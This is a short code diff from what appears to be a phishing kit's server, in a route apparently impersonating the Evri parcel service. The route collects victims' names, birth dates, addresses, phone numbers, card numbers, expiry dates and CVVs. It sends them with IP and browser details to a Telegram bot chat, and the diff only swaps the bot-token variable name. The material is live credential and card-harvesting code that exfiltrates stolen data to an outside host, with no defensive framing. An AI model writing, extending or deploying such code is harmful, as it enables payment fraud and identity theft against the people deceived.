@@ -3451,7 +3451,7 @@ app.post("/haytchEvri", (req, res) => {
       var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
       axios
         .post(
-          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=-673884200&text=HAYTCHRES:\n${originalText}`
+          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-673884200&text=HAYTCHRES:\n${originalText}`
         )
         .catch((e) => {
           console.log(e);
